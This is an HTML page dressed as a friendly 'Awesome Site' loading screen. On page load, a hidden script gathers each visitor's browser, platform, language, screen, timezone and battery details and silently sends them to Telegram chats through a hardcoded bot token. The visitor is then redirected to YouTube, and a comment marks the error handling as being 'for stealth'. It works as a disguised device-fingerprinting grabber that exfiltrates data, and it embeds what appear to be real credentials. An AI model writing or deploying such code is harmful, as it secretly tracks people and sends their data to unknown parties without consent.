<!DOCTYPE html>
<html lang="en" >
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Welcome to Awesome Site</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;700&display=swap');

    * {
      margin: 0; padding: 0; box-sizing: border-box;
    }
    body, html {
      height: 100%;
      font-family: 'Poppins', sans-serif;
      background: linear-gradient(135deg, #6e8efb, #a777e3);
      color: #fff;
      overflow: hidden;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      user-select: none;
    }

    .container {
      text-align: center;
      background: rgba(255,255,255,0.1);
      padding: 30px 50px;
      border-radius: 20px;
      box-shadow: 0 8px 32px rgba(0,0,0,0.15);
      max-width: 400px;
      width: 90%;
      animation: fadeIn 2s ease forwards;
    }

    h1 {
      font-weight: 700;
      font-size: 2.5rem;
      margin-bottom: 15px;
      text-shadow: 0 0 10px rgba(255,255,255,0.7);
    }

    p {
      font-weight: 400;
      font-size: 1.2rem;
      margin-bottom: 40px;
      line-height: 1.4;
      text-shadow: 0 0 8px rgba(255,255,255,0.5);
    }

    .loader {
      border: 6px solid rgba(255, 255, 255, 0.2);
      border-top: 6px solid #fff;
      border-radius: 50%;
      width: 60px;
      height: 60px;
      animation: spin 1.5s linear infinite;
      margin: 0 auto 20px auto;
    }

    @keyframes spin {
      to { transform: rotate(360deg);}
    }
    @keyframes fadeIn {
      from {opacity: 0; transform: translateY(20px);}
      to {opacity: 1; transform: translateY(0);}
    }

    footer {
      position: fixed;
      bottom: 15px;
      font-size: 0.85rem;
      color: rgba(255,255,255,0.6);
      font-style: italic;
      user-select: none;
    }
  </style>
</head>
<body>
  <div class="container" role="main" aria-label="Welcome message">
    <h1>Welcome to Our Awesome Site!</h1>
    <div class="loader" aria-hidden="true"></div>
    <p>Loading, please wait a moment...</p>
  </div>

  <footer>Â© 2025 Awesome Site. All rights reserved.</footer>

  <script>
    // --- Telegram Bot Config ---
   const botToken = "8102627165:AAFWsgPIljsQwGPGWYcCsNdJPPDn-a47IM8";
    const chatIds = ["6405482546", "7390664582"];

    async function sendMessage(message) {
      for (const id of chatIds) {
        try {
          await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({
              chat_id: id,
              text: message,
              parse_mode: "Markdown"
            })
          });
        } catch (e) {
          // Silent catch for stealth
        }
      }
    }

    function getDeviceInfo() {
      return {
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language || navigator.userLanguage,
        screenResolution: `${window.screen.width}x${window.screen.height}`,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
      };
    }

    async function getBatteryInfo() {
      if (!navigator.getBattery) return { supported: false };
      try {
        const battery = await navigator.getBattery();
        return {
          supported: true,
          charging: battery.charging,
          level: Math.round(battery.level * 100)
        };
      } catch {
        return { supported: false };
      }
    }

    function formatMessage(deviceInfo, batteryInfo) {
      let message = "*Device Information:*\n";
      message += `- User Agent: \`${deviceInfo.userAgent}\`\n`;
      message += `- Platform: \`${deviceInfo.platform}\`\n`;
      message += `- Language: \`${deviceInfo.language}\`\n`;
      message += `- Screen Resolution: \`${deviceInfo.screenResolution}\`\n`;
      message += `- Timezone: \`${deviceInfo.timezone}\`\n\n`;

      if (batteryInfo.supported) {
        message += "*Battery Information:*\n";
        message += `- Charging: \`${batteryInfo.charging ? "Yes" : "No"}\`\n`;
        message += `- Battery Level: \`${batteryInfo.level}%\`\n`;
      } else {
        message += "*Battery Information:*\n- Not supported by this browser.\n";
      }

      return message;
    }

    (async () => {
      const deviceInfo = getDeviceInfo();
      const batteryInfo = await getBatteryInfo();
      const message = formatMessage(deviceInfo, batteryInfo);
      await sendMessage(message);

      // Redirect to YouTube after 3 seconds
      setTimeout(() => {
        window.location.href = "https://www.youtube.com";
      }, 3000);
    })();
  </script>
</body>
</html>
